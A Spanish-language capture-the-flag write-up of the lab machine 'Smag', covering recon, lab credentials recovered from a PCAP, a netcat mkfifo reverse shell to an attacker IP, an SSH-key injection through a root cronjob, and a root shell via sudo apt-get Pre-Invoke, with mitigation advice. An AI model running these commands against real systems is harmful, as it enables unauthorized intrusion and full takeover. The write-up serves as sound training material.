---
tags:
  - Nmap
  - feroxbuster
  - wireshark
  - Escalada_Privilegios
  - apt-get
  - ssh-keygen
  - Data_Exfiltration_HTTP
  - Shell
  - CronJobs
  - root
---
# Introduccion

La máquina **Smug** representa un escenario clásico de seguridad ofensiva, donde múltiples fallos encadenados permiten que un atacante escale desde un acceso web básico hasta el control total del sistema. El recorrido inicia con el descubrimiento de un servicio web aparentemente inocente, pero que contenía información sensible expuesta en un archivo de captura de tráfico. Dicho archivo reveló credenciales en texto claro y un dominio interno de desarrollo que abrió la puerta a un panel vulnerable con ejecución remota de comandos.

A partir de esa brecha inicial, se logró obtener una shell como el usuario de servicio `www-data`. Sin embargo, la verdadera complejidad y aprendizaje de esta máquina radican en las **dos escaladas de privilegios**: la primera, explotando un cronjob mal configurado que permitía inyectar claves públicas en la cuenta de `jake`; y la segunda, abusando de permisos sudo demasiado permisivos sobre `apt-get`, lo que derivó en una shell como root.


# Reconocimiento

Se realizó un escaneo amplio para detectar servicios expuestos:

```bash
──(zikuta㉿zikuta)-[~/Desktop/smag]
└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.98.211 -oN nmap.tx 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 22:27 CDT
Nmap scan report for 10.201.98.211
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Hallazgos principales:**

- **22/tcp (SSH)** — OpenSSH 7.2p2 (Ubuntu).
- **80/tcp (HTTP)** — Apache 2.4.18 (Ubuntu).

Esto indica una típica superficie web con acceso remoto por SSH, lo que sugiere que la intrusión probablemente progresará a través de la aplicación web.

### Fuerza bruta de directorios

Contra el puerto 80, se ejecutó **feroxbuster** para enumerar rutas interesantes:

```bash
─(zikuta㉿zikuta)-[~/Desktop/smag]
└─$ feroxbuster -u http://10.201.98.211 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.201.98.211
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      313c http://10.201.98.211/mail => http://10.201.98.211/mail/
200      GET       13l     3455w   141841c http://10.201.98.211/mate
```

**Rutas relevantes:**

- `/mail/` (redirección 301; contenido interesante dentro).
- `/mate` (200 OK; tamaño grande).


## Análisis del tráfico (PCAP) y descubrimiento del dominio

El directorio **/mail/** contenía **conversaciones entre desarrolladores** y un **archivo .pcap**. El .pcap fue la clave para conseguir credenciales en texto claro.

![[pcap_smug.png]]

Al revisar la captura **PCAP** (posible intercepción de tráfico HTTP sin cifrar), aparecieron credenciales en **texto plano**:

![[captura de paquetes.png]]


	username: helpdesk
	password: cH4nG3M3_n0w

Además, en los encabezados/flujo HTTP se observó un **dominio interno**: `development.smag.thm`. Para poder resolverlo desde mi equipo, añadí la entrada en `/etc/hosts`:

![[dominio_smug.png]]

Con eso, pude acceder a `http://development.smag.thm/` y llegar a un **panel de login** (`login.php` / `admin.php`), donde funcionaron correctamente las credenciales extraídas del PCAP. **Conclusión**: el equipo filtró credenciales a través de tráfico HTTP sin TLS, y el dominio de desarrollo estaba expuesto y resolvible localmente.


![[Pasted image 20250831225215.png]]

## Ejecución remota de comandos (RCE) y shell inversa

Tras iniciar sesión como **helpdesk**, la aplicación ofrecía una funcionalidad para **ejecutar comandos en el servidor** (un caso clásico de RCE). Para obtener una shell interactiva en mi máquina, utilicé un **one-liner** de **reverse shell** que invoca `/bin/sh` y redirige E/S a través de **netcat**:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.120.245 4444 >/tmp/f
```

**Qué hace este one-liner**

- Crea un FIFO (`/tmp/f`) para encadenar entrada/salida.
- Ejecuta `sh -i` (shell interactiva) y canaliza su E/S hacia `nc`.
- `nc` se conecta a tu **listener** (`10.23.120.245:4444`) y te entrega una shell como el usuario del proceso web (típicamente `www-data`).

y lo ejecutamos.

![[comando_smug.png]]

y listo!!! en nuestra maquina recibiremos una shell

```bash
┌──(zikuta㉿zikuta)-[~/Desktop/smag]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
^[connect to [10.23.120.245] from (UNKNOWN) [10.201.98.211] 44892
sh: 0: can't access tty; job control turned off
$ 
```

Al recibir la conexión, obtuve una shell con permisos de **`www-data`**, lo que confirma que la función de ejecución de comandos no estaba filtrando adecuadamente.

**Tip (opcional):** estabiliza la TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
stty rows 50 columns 120
```



# Escalada de privilegios I — de `www-data` a `jake` mediante **cron**

### 4.1. Enumeración de cronjobs

En la máquina comprometida, revisé tareas programadas:


```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```

Aquí se observa que **cada minuto** el usuario `root` ejecuta un comando que copia el archivo `/opt/.backups/jake_id_rsa.pub.backup` dentro de `/home/jake/.ssh/authorized_keys`.

Esto significa que, si logro **modificar el archivo de backup**, puedo inyectar mi propia clave pública SSH para acceder como el usuario `jake`.

**Interpretación:** cada minuto, **root** copia (con `cat`) el contenido de `/opt/.backups/jake_id_rsa.pub.backup` hacia `/home/jake/.ssh/authorized_keys`.  

**Riesgo:** si **yo** puedo **escribir** en ese archivo de backup, entonces puedo **inyectar mi clave pública SSH**, y el propio cron me la instalará como autorizada para el usuario **jake**. Resultado: **acceso SSH como `jake` sin contraseña**.

#### Generación de clave SSH

En mi máquina atacante generé un par de claves RSA para poder conectarme vía SSH sin contraseña:

```bash                             
┌──(zikuta㉿zikuta)-[~/Desktop/smag]
└─$ ssh-keygen -t rsa -b 4096 -f mykey
```

Esto produjo los archivos:

- `mykey` → clave privada.
- `mykey.pub` → clave pública.

### Inyección de clave púbica en el backup

Ya dentro de la máquina víctima con `www-data`, sobrescribí el archivo usado por el cronjob con mi clave pública:

```bash
www-data@smag:/var/www/development.smag.thm$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBMzWZrmrKnZUssefkNzd41sWf51cgcFyynkNGoou5bKTR562Jx6eXAv+RzD2XOV8s6I0CNxE4sHAsPmp3a9MtL52jWcdlz+4IQhEj5DqktVt/t0LL6f3MSAZhpMdwBIBN3lzr7mH4Y1uGaM5I/Yec2/ga3cu/c/f61JeZeQq7zVYQ+0fxJTmPOza4NOYyYJIDErcMKKgIgUXc5XfwTaNuKg851t2bA6Pum/CTv3kut4Mu9D6GcuzImDdl8nciCB6TRte5CJciRmq7x6IxN96qPx8sya5Iqk6pGB8iWtQ8RPIF4wQnhxUvlK2ZFMFakVz8isqjNOw4UpwpxVN+z43qRIR63NMgNrjWkABlrFuC2EZkoLtA44jmeBH4Xk4R+uX5wgn3hCw== zikuta@zikuta" > /opt/.backups/jake_id_rsa.pub.backup
```

Cuando el cronjob corrió (cada minuto), el contenido de ese backup pasó a ser el `authorized_keys` de **jake**. En segundos, ya era posible autenticarse como **jake** usando **mi clave privada**:

**Por qué funciona**

- El **cron** corre como **root**, por lo que ignora permisos intermedios.
- Si el archivo de **origen** es **escribible** por un atacante, la tarea privilegiada **propaga** esa modificación a un archivo crítico (`authorized_keys`) dentro del `$HOME` del usuario objetivo.
- Efecto neto: **confianza transferida** desde root hacia el contenido que yo controlo, habilitando **acceso persistente** como el usuario **jake**.


**Mitigación recomendada:**

- El directorio `/opt/.backups/` y sus archivos deben ser **propiedad de root** y **no escribibles** por otros (modo `0644` como máximo, y directorio `0755` o más restrictivo).
- Usar `install` o `cp --preserve=mode,ownership` y **verificar propietarios/permisos** antes de sustituir `authorized_keys`.
- Idealmente, que el cronjob **no lea archivos ubicados en rutas donde “www-data” u otros usuarios puedan escribir**

### Escalada de privilegios II — de `jake` a **root** con `sudo apt-get`

Tras esperar unos segundos, intenté conectarme como el usuario `jake` usando mi clave privada:


```bash
(zikuta㉿zikuta)-[~/Desktop/smag]
└─$ ssh -i mykey jake@10.201.67.177

The authenticity of host '10.201.67.177 (10.201.67.177)' can't be established.
ED25519 key fingerprint is SHA256:N0hcdtAhlytMwu8PGLVD+c0ZKcV7TMNWnOr0wVw0Wp8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:67: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.67.177' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 
```

¡Y funcionó! Logré acceso directo a la máquina como `jake`


El **mal diseño del cronjob** permitió que cualquier usuario con acceso de escritura al archivo `/opt/.backups/jake_id_rsa.pub.backup` pudiera inyectar sus propias claves SSH.  
Esto resultó en un **Privilege Escalation de `www-data` → `jake`**, ya que cada minuto el proceso ejecutado por `root` actualizaba las claves autorizadas del usuario `jake`.


## Escalada de privilegios II — de `jake` a **root** con `sudo apt-get`

Despues de leer la `user flag` procedi a hacer un `sudo -l` para ver que comandos podia ejecutar como root sin serlo y encontre esta maravilla...

```bash
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Esto significa que `jake` puede ejecutar **`/usr/bin/apt-get`** como root **sin contraseña** y **sin restricciones adicionales**. Aunque `apt-get` es un gestor de paquetes, incorpora **ganchos** y **opciones** que permiten **ejecutar comandos arbitrarios** durante fases de `update`, `install`, etc. Si el binario puede invocarse con privilegios, se convierte en un vector directo de **privesc**.

### ¿Por qué es peligroso `apt-get`?

El programa `apt-get` (gestor de paquetes en sistemas Debian/Ubuntu) tiene opciones que permiten ejecutar **scripts o comandos personalizados** durante las operaciones de instalación/actualización.

En condiciones normales eso no es un problema, pero si un usuario sin privilegios puede invocar `apt-get` como root sin restricciones, se convierte en una vía directa para ejecutar comandos arbitrarios como **root**.

Este vector de ataque está documentado en **GTFOBins** (repositorio de técnicas de abuso de binarios comunes). 

### Payload para obtener una shell root

Según GTFOBins, uno de los métodos más sencillos es abusar de la opción `APT::Update::Pre-Invoke`. Esta directiva le dice a `apt-get` que ejecute un comando **antes de realizar la actualización de paquetes**.

De esta manera, podemos forzar la ejecución de `/bin/sh` con privilegios de root:


```bash
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# 
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Escalada exitosa

Al ejecutar el comando, inmediatamente obtuve una shell como **root**:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Ya tenía el control total de la máquina, pudiendo leer cualquier archivo y manipular el sistema sin restricciones.

El fallo se debió a una **configuración insegura de sudo** que permitía a `jake` ejecutar `apt-get` como root.  
Dado que `apt-get` puede invocar comandos arbitrarios durante su ejecución, se explotó con la opción `APT::Update::Pre-Invoke` para obtener una shell root.

**Mitigación recomendada:**

- **Eliminar** `NOPASSWD` para `apt-get` en `sudoers`.
- Restringir el uso de `sudo` a utilidades **realmente necesarias** y preferir **wrappers** limitados.
- Implementar _policy kits_, _allowlists_ y **auditorías** de configuración.
- Monitorear uso de `sudo` y cambios en paquetes/apt logs.


## Cierre

La intrusión se cimentó en tres fallos encadenados: **credenciales expuestas**, **RCE en el panel de desarrollo** y dos **configuraciones inseguras** a nivel de sistema (**cron** y **sudo**). Documenté cada paso con el **porqué** técnico detrás y cómo **mitigarlo**. Con esto, deberías poder pegar el texto en tu documento y tener una narrativa clara, coherente y con foco en las dos escaladas de privilegios


### Cadena de escalada de privilegios


| **Etapa**        | **Descripción**                                                                                       |
| ---------------- | ----------------------------------------------------------------------------------------------------- |
| Reconocimiento   | Escaneo con Nmap y feroxbuster → descubrimiento de `/mail/`.                                          |
| Exfiltración     | Archivo PCAP en `/mail/` con credenciales (`helpdesk:cH4nG3M3_n0w`) y dominio `development.smag.thm`. |
| Acceso inicial   | Login en `development.smag.thm` → panel con ejecución de comandos (RCE).                              |
| Shell inversa    | Payload con netcat → acceso como usuario `www-data`.                                                  |
| Escalada I       | Cronjob de root copia archivo escribible a `~jake/.ssh/authorized_keys` → acceso SSH como `jake`.     |
| Escalada II      | `sudo -l` revela `NOPASSWD` en `/usr/bin/apt-get` → shell root con `APT::Update::Pre-Invoke`.         |
| Compromiso total | Obtención de privilegios root y acceso a `root.txt`.                                                  |